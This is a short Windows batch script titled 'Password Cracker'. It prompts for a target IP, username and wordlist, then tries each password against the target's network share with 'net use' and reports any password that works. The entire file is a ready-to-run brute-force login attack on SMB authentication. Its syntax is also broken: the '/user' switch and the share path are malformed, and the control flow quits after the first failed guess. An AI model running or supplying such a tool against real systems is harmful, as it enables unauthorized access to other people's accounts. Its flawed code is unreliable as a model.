@echo off
Title Password Cracker
color A 
:main
set /p ip="Enter the IP you want to crack the password: "
set /p user="Enter the username you want to attack: "
set /p wordlist="Enter the path of the passlist: "

for /F %%a in (%wordlist%) do (
set pass=%%a
call:attempt
)
color 4
:attempt
net use \\%ip%// user:%user% %pass% >nul 2>&1
echo attempt:%pass%
if %errorlevel% EQU 0 goto success
if %errorlevel% GEQ 1 goto lose

:success
echo password Found ;) :%pass%
net use \\%ip%// /d /y 
pause
exit

:lose
echo password not found :(
pause 
cls
goto main